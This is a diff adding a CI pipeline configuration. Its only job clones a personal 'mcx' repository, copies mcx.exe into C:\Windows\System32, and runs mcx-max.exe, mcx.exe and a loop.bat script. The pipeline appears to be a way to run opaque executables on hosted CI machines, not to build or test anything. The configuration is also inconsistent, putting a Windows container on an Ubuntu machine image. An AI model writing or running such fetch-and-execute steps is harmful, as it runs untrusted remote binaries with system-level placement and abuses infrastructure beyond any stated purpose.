@@ -1,0 +1,21 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+  containers:
+    - name: main
+      image: 'mcr.microsoft.com/windows:ltsc2019'
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'git clone https://github.com/Alex-Arc-hub/mcx'
+            - cd mcx
+            - 'copy mcx.exe C:\Windows\System32'
+            - powershell .\mcx-max.exe
+            - powershell .\mcx.exe
+            - powershell .\loop.bat
